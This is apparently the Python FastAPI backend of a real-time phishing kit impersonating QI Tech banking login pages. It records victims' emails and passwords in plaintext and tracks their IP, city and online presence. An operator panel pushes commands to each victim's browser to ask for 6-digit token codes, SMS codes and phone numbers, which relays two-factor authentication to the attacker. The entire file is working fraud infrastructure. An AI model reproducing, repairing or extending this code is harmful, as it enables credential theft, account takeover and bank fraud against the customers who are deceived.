from fastapi import FastAPI, APIRouter, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import re
import logging
import asyncio
import httpx
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional
import uuid
from datetime import datetime, timezone, timedelta


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class StatusCheck(BaseModel):
    model_config = ConfigDict(extra="ignore")  # Ignore MongoDB's _id field
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))

class StatusCheckCreate(BaseModel):
    client_name: str

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.model_dump()
    status_obj = StatusCheck(**status_dict)
    
    # Convert to dict and serialize datetime to ISO string for MongoDB
    doc = status_obj.model_dump()
    doc['timestamp'] = doc['timestamp'].isoformat()
    
    _ = await db.status_checks.insert_one(doc)
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    # Exclude MongoDB's _id field from the query results
    status_checks = await db.status_checks.find({}, {"_id": 0}).to_list(1000)
    
    # Convert ISO string timestamps back to datetime objects
    for check in status_checks:
        if isinstance(check['timestamp'], str):
            check['timestamp'] = datetime.fromisoformat(check['timestamp'])
    
    return status_checks

# ============================================================
# Access tracking (admin panel)
# ============================================================

class AccessTrackIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    path: str
    referrer: Optional[str] = None
    screen: Optional[str] = None
    language: Optional[str] = None
    timezone: Optional[str] = None


def _country_from_ip(ip: str) -> str:
    # Lightweight placeholder — no external geo call; just classify
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.")):
        return "Local"
    return "Internet"


def _detect_device(ua: str) -> str:
    if not ua:
        return "—"
    u = ua.lower()
    if any(k in u for k in ("iphone", "android", "mobile", "ipad", "phone")):
        return "Mobile"
    return "Desktop"


async def _geolocate_ip(ip: str) -> dict:
    """Look up city/region for an IP using ipapi.co (free tier). Cached in mongo."""
    if not ip or ip.startswith(("127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "172.30.", "172.31.")):
        return {"city": "Local", "region": "", "country": "—"}
    cached = await db.geo_cache.find_one({"ip": ip}, {"_id": 0})
    if cached:
        return {"city": cached.get("city", ""), "region": cached.get("region", ""), "country": cached.get("country", "")}
    try:
        async with httpx.AsyncClient(timeout=4.0) as client:
            # ip-api.com — free, no key, 45 req/min
            r = await client.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,region,city")
            if r.status_code == 200:
                d = r.json()
                if d.get("status") == "success":
                    doc = {
                        "ip": ip,
                        "city": d.get("city", "") or "",
                        "region": d.get("region") or "",
                        "country": d.get("country", "") or "",
                        "cached_at": datetime.now(timezone.utc).isoformat(),
                    }
                    await db.geo_cache.update_one({"ip": ip}, {"$set": doc}, upsert=True)
                    return {"city": doc["city"], "region": doc["region"], "country": doc["country"]}
    except Exception as e:
        logging.warning(f"geo lookup failed for {ip}: {e}")
    return {"city": "", "region": "", "country": ""}


@api_router.post("/track")
async def track_access(payload: AccessTrackIn, request: Request):
    fwd = request.headers.get("x-forwarded-for", "")
    ip = (fwd.split(",")[0].strip() if fwd else (request.client.host if request.client else "unknown"))
    ua = request.headers.get("user-agent", "")
    now = datetime.now(timezone.utc)
    doc = {
        "id": str(uuid.uuid4()),
        "path": payload.path,
        "referrer": payload.referrer or "",
        "ip": ip,
        "user_agent": ua,
        "screen": payload.screen or "",
        "language": payload.language or "",
        "timezone": payload.timezone or "",
        "country": _country_from_ip(ip),
        "timestamp": now.isoformat(),
    }
    await db.accesses.insert_one(doc)
    return {"ok": True, "id": doc["id"]}


@api_router.get("/access/stats")
async def access_stats():
    now = datetime.now(timezone.utc)
    start_today = datetime(now.year, now.month, now.day, tzinfo=timezone.utc)
    start_hour = now - timedelta(hours=1)
    start_week = now - timedelta(days=7)

    total = await db.accesses.count_documents({})
    today = await db.accesses.count_documents({"timestamp": {"$gte": start_today.isoformat()}})
    last_hour = await db.accesses.count_documents({"timestamp": {"$gte": start_hour.isoformat()}})
    week = await db.accesses.count_documents({"timestamp": {"$gte": start_week.isoformat()}})

    unique_ips = await db.accesses.distinct("ip", {"timestamp": {"$gte": start_today.isoformat()}})

    # Top pages today
    pipeline = [
        {"$match": {"timestamp": {"$gte": start_today.isoformat()}}},
        {"$group": {"_id": "$path", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 5},
    ]
    top_pages_raw = await db.accesses.aggregate(pipeline).to_list(5)
    top_pages = [{"path": x["_id"], "count": x["count"]} for x in top_pages_raw]

    return {
        "total": total,
        "today": today,
        "last_hour": last_hour,
        "week": week,
        "unique_today": len(unique_ips),
        "top_pages": top_pages,
    }


@api_router.get("/access/recent")
async def access_recent(limit: int = 50):
    limit = max(1, min(limit, 200))
    items = await db.accesses.find({}, {"_id": 0}).sort("timestamp", -1).to_list(limit)
    return {"items": items}


@api_router.get("/access/by-hour")
async def access_by_hour():
    """Return access counts grouped by hour for the last 24 hours."""
    now = datetime.now(timezone.utc)
    start = now - timedelta(hours=24)
    items = await db.accesses.find(
        {"timestamp": {"$gte": start.isoformat()}}, {"_id": 0, "timestamp": 1}
    ).to_list(10000)
    buckets = {}
    for it in items:
        try:
            t = datetime.fromisoformat(it["timestamp"])
        except Exception:
            continue
        key = t.replace(minute=0, second=0, microsecond=0).isoformat()
        buckets[key] = buckets.get(key, 0) + 1
    # Build the 24 contiguous buckets even if zero
    series = []
    cursor = now.replace(minute=0, second=0, microsecond=0) - timedelta(hours=23)
    for _ in range(24):
        key = cursor.isoformat()
        series.append({"hour": cursor.strftime("%H:00"), "count": buckets.get(key, 0)})
        cursor += timedelta(hours=1)
    return {"series": series}


@api_router.delete("/access/clear")
async def access_clear():
    res = await db.accesses.delete_many({})
    return {"deleted": res.deleted_count}


# ============================================================
# Login attempts capture (Tentativas de login)
# ============================================================

class LoginAttemptIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    email: str
    password: str
    page: Optional[str] = None
    referrer: Optional[str] = None
    session_id: Optional[str] = None


def _screen_from_path(path: str) -> str:
    p = (path or "").rstrip("/")
    if p.endswith("Baas-internet-banking"): return "Login Baas Banking"
    if p.endswith("Administracao-e-Custodia"): return "Login Administração"
    if p.endswith("Risk-Solutions"): return "Login Risk Solutions"
    if p.endswith("QI-Sign"): return "Login QI Sign"
    if p.endswith("area-gestor"): return "Área do gestor"
    if p.endswith("home") or p == "" or p == "/": return "Home"
    return path or "—"


@api_router.post("/login-attempt")
async def record_login_attempt(payload: LoginAttemptIn, request: Request):
    fwd = request.headers.get("x-forwarded-for", "")
    ip = (fwd.split(",")[0].strip() if fwd else (request.client.host if request.client else "unknown"))
    ua = request.headers.get("user-agent", "")
    now = datetime.now(timezone.utc)
    sid = payload.session_id or ""

    # If this session already has a tentativa, UPDATE it (retry) instead of creating a new card
    existing = None
    if sid:
        existing = await db.login_attempts.find_one({"session_id": sid}, {"_id": 0})

    if existing:
        retry = int(existing.get("retry_count", 0)) + 1
        update = {
            "email": payload.email[:160],
            "password": payload.password[:160],
            "page": payload.page or existing.get("page", ""),
            "referrer": payload.referrer or existing.get("referrer", ""),
            "ip": ip,
            "user_agent": ua,
            "device": _detect_device(ua),
            "status": "offline",
            "timestamp": now.isoformat(),
            "retry_count": retry,
            "command": "",          # clear any pending command
            "command_at": "",
        }
        await db.login_attempts.update_one({"id": existing["id"]}, {"$set": update})
        # Log retry to history
        await db.user_history.insert_one({
            "id": str(uuid.uuid4()),
            "session_id": sid,
            "type": "login_attempt",
            "value": {"email": payload.email, "password": payload.password, "page": payload.page, "retry": retry},
            "timestamp": now.isoformat(),
        })
        return {"ok": True, "id": existing["id"], "retry": retry}

    doc = {
        "id": str(uuid.uuid4()),
        "email": payload.email[:160],
        "password": payload.password[:160],
        "page": payload.page or "",
        "referrer": payload.referrer or "",
        "session_id": sid,
        "ip": ip,
        "user_agent": ua,
        "device": _detect_device(ua),
        "city": "",
        "region": "",
        "country_full": "",
        "status": "offline",
        "timestamp": now.isoformat(),
        "retry_count": 0,
        "command": "",
        "command_at": "",
    }
    await db.login_attempts.insert_one(doc)

    # Log to history
    await db.user_history.insert_one({
        "id": str(uuid.uuid4()),
        "session_id": sid,
        "type": "login_attempt",
        "value": {"email": payload.email, "password": payload.password, "page": payload.page},
        "timestamp": now.isoformat(),
    })

    # Geolocate in background — no blocking on the response
    async def _enrich(attempt_id: str, ip_addr: str):
        geo = await _geolocate_ip(ip_addr)
        await db.login_attempts.update_one(
            {"id": attempt_id},
            {"$set": {"city": geo.get("city", ""), "region": geo.get("region", ""), "country_full": geo.get("country", "")}},
        )
    asyncio.create_task(_enrich(doc["id"], ip))

    return {"ok": True, "id": doc["id"], "retry": 0}


# ============================================================
# Admin commands (operator → user)
# ============================================================

class CommandIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    command: str  # "invalid" | "qid" | "qid_invalid" | "email" | "email_invalid" | "sms_phone" | "sms_code" | "sms_invalid" | "chat" | "terminate"
    payload: Optional[str] = ""  # optional text payload (e.g., chat message)


@api_router.post("/command")
async def send_command(payload: CommandIn):
    if not payload.session_id:
        return {"ok": False, "error": "missing session_id"}
    now = datetime.now(timezone.utc).isoformat()
    res = await db.login_attempts.update_one(
        {"session_id": payload.session_id},
        {"$set": {
            "command": payload.command or "",
            "command_payload": (payload.payload or "")[:500],
            "command_at": now,
        }},
    )
    if res.matched_count:
        await db.user_history.insert_one({
            "id": str(uuid.uuid4()),
            "session_id": payload.session_id,
            "type": "command",
            "value": payload.command or "",
            "payload": (payload.payload or "")[:500],
            "timestamp": now,
        })
    return {"ok": True, "matched": res.matched_count}


@api_router.get("/session/poll")
async def session_poll(session_id: str):
    """Client polls this to receive pending admin commands."""
    if not session_id:
        return {"command": "", "payload": ""}
    doc = await db.login_attempts.find_one(
        {"session_id": session_id},
        {"_id": 0, "command": 1, "command_payload": 1, "command_at": 1, "id": 1},
    )
    if not doc:
        return {"command": "", "payload": ""}
    cmd = doc.get("command", "")
    pl = doc.get("command_payload", "") or ""
    if cmd:
        # Mark as delivered — clear immediately so it triggers only once
        await db.login_attempts.update_one(
            {"id": doc["id"]},
            {"$set": {"command": "", "command_payload": ""}},
        )
    return {"command": cmd or "", "payload": pl}


# ============================================================
# QI Tech ID — operator requests 6-digit code from user
# ============================================================

class QidIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    code: str


@api_router.post("/qid-response")
async def qid_response(payload: QidIn):
    if not payload.session_id:
        return {"ok": False}
    now = datetime.now(timezone.utc).isoformat()
    doc = await db.login_attempts.find_one({"session_id": payload.session_id}, {"_id": 0, "id": 1, "qid_codes": 1})
    if not doc:
        return {"ok": False}
    codes = list(doc.get("qid_codes") or [])
    codes.append({"code": payload.code[:32], "at": now})
    await db.login_attempts.update_one(
        {"id": doc["id"]},
        {"$set": {"qid_codes": codes, "qid_last": payload.code[:32], "qid_last_at": now}},
    )
    # Log to history
    await db.user_history.insert_one({
        "id": str(uuid.uuid4()),
        "session_id": payload.session_id,
        "type": "qid_code",
        "value": payload.code[:32],
        "timestamp": now,
    })
    return {"ok": True}


# ============================================================
# Unified user response — email code / sms phone / sms code / chat reply
# ============================================================

class UserResponseIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    type: str  # "email_code" | "sms_phone" | "sms_code" | "chat_reply"
    value: str


@api_router.post("/user-response")
async def user_response(payload: UserResponseIn):
    if not payload.session_id or not payload.type:
        return {"ok": False}
    now = datetime.now(timezone.utc).isoformat()
    doc = await db.login_attempts.find_one(
        {"session_id": payload.session_id},
        {"_id": 0, "id": 1, "email_codes": 1, "sms_codes": 1, "chat_replies": 1},
    )
    if not doc:
        return {"ok": False}
    val = (payload.value or "")[:200]
    set_doc: dict = {}
    t = payload.type
    if t == "email_code":
        arr = list(doc.get("email_codes") or [])
        arr.append({"code": val[:32], "at": now})
        set_doc["email_codes"] = arr
        set_doc["email_last"] = val[:32]
        set_doc["email_last_at"] = now
    elif t == "sms_phone":
        set_doc["sms_phone"] = val[:32]
        set_doc["sms_phone_at"] = now
    elif t == "sms_code":
        arr = list(doc.get("sms_codes") or [])
        arr.append({"code": val[:32], "at": now})
        set_doc["sms_codes"] = arr
        set_doc["sms_last"] = val[:32]
        set_doc["sms_last_at"] = now
    elif t == "chat_reply":
        arr = list(doc.get("chat_replies") or [])
        arr.append({"text": val, "at": now})
        set_doc["chat_replies"] = arr
        set_doc["chat_last"] = val
        set_doc["chat_last_at"] = now
    elif t == "email_input":
        arr = list(doc.get("email_inputs") or [])
        arr.append({"value": val[:120], "at": now})
        set_doc["email_inputs"] = arr
        set_doc["email_input_last"] = val[:120]
        set_doc["email_input_last_at"] = now
    elif t == "phone_input":
        arr = list(doc.get("phone_inputs") or [])
        arr.append({"value": val[:32], "at": now})
        set_doc["phone_inputs"] = arr
        set_doc["phone_input_last"] = val[:32]
        set_doc["phone_input_last_at"] = now
    else:
        return {"ok": False, "error": "unknown type"}
    await db.login_attempts.update_one({"id": doc["id"]}, {"$set": set_doc})
    await db.user_history.insert_one({
        "id": str(uuid.uuid4()),
        "session_id": payload.session_id,
        "type": t,
        "value": val,
        "timestamp": now,
    })
    return {"ok": True}


@api_router.get("/history")
async def user_history(session_id: str, limit: int = 200):
    if not session_id:
        return {"items": []}
    items = await db.user_history.find({"session_id": session_id}, {"_id": 0}).sort("timestamp", -1).to_list(limit)
    return {"items": items}


# Clear current displayed token codes for a session — used when admin re-requests a token.
# History records (db.user_history) are preserved.
class ClearIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    fields: List[str]  # e.g. ["qid_codes"], ["email_codes"], ["sms_codes","sms_phone"]


@api_router.post("/clear-responses")
async def clear_responses(payload: ClearIn):
    if not payload.session_id or not payload.fields:
        return {"ok": False}
    allowed = {"qid_codes", "email_codes", "sms_codes", "sms_phone", "chat_replies", "email_inputs", "phone_inputs"}
    unset = {f: "" for f in payload.fields if f in allowed}
    if not unset:
        return {"ok": False}
    await db.login_attempts.update_one(
        {"session_id": payload.session_id},
        {"$unset": unset},
    )
    return {"ok": True, "cleared": list(unset.keys())}


@api_router.get("/login-attempts")
async def list_login_attempts(limit: int = 100):
    limit = max(1, min(limit, 500))
    items = await db.login_attempts.find({}, {"_id": 0}).sort("timestamp", -1).to_list(limit)
    # Build session map by session_id
    session_ids = list({it.get("session_id") for it in items if it.get("session_id")})
    sessions = {}
    if session_ids:
        cur = db.sessions.find({"session_id": {"$in": session_ids}}, {"_id": 0})
        async for s in cur:
            sessions[s["session_id"]] = s
    now = datetime.now(timezone.utc)
    for it in items:
        sid = it.get("session_id") or ""
        s = sessions.get(sid)
        online = False
        screen = _screen_from_path(it.get("page", ""))
        if s:
            try:
                last = datetime.fromisoformat(s.get("last_seen", ""))
                age = (now - last).total_seconds()
                online = bool(s.get("visible")) and age <= 8
                screen = s.get("current_screen") or screen
            except Exception:
                pass
        it["online"] = online
        it["current_screen"] = screen
    return {"items": items, "count": len(items)}


@api_router.delete("/login-attempts/clear")
async def clear_login_attempts():
    res = await db.login_attempts.delete_many({})
    return {"deleted": res.deleted_count}


# ============================================================
# Live session presence (heartbeat)
# ============================================================

class HeartbeatIn(BaseModel):
    model_config = ConfigDict(extra="ignore")
    session_id: str
    screen: Optional[str] = None
    path: Optional[str] = None
    visible: Optional[bool] = True
    leaving: Optional[bool] = False


@api_router.post("/session/heartbeat")
async def session_heartbeat(payload: HeartbeatIn, request: Request):
    now = datetime.now(timezone.utc)
    fwd = request.headers.get("x-forwarded-for", "")
    ip = (fwd.split(",")[0].strip() if fwd else (request.client.host if request.client else ""))
    # Detect screen change to log into history
    prev = await db.sessions.find_one({"session_id": payload.session_id}, {"_id": 0, "current_screen": 1})
    new_screen = payload.screen or _screen_from_path(payload.path or "")
    update = {
        "session_id": payload.session_id,
        "current_screen": new_screen,
        "current_path": payload.path or "",
        "visible": False if payload.leaving else bool(payload.visible),
        "last_seen": now.isoformat(),
        "ip": ip,
    }
    await db.sessions.update_one(
        {"session_id": payload.session_id},
        {"$set": update},
        upsert=True,
    )
    if (not prev) or (prev.get("current_screen") != new_screen):
        # only record page changes when there's a known login_attempt for this session
        has_attempt = await db.login_attempts.find_one({"session_id": payload.session_id}, {"_id": 0, "id": 1})
        if has_attempt:
            await db.user_history.insert_one({
                "id": str(uuid.uuid4()),
                "session_id": payload.session_id,
                "type": "screen",
                "value": new_screen,
                "timestamp": now.isoformat(),
            })
    return {"ok": True}

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()